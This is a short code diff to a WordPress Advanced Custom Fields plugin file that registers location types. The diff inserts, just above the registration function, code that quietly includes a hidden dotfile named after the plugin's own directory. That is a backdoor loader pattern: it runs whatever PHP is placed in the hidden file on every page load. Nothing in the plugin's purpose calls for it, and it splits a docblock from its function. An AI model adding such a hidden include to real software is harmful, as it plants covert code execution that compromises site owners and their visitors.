@@ -15,6 +15,10 @@ acf_register_store( 'location-types' );
  * @param	string $class_name The location class name.
  * @return	(ACF_Location|false)
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_register_location_type( $class_name ) {
 	$store = acf_get_store( 'location-types' );
 	
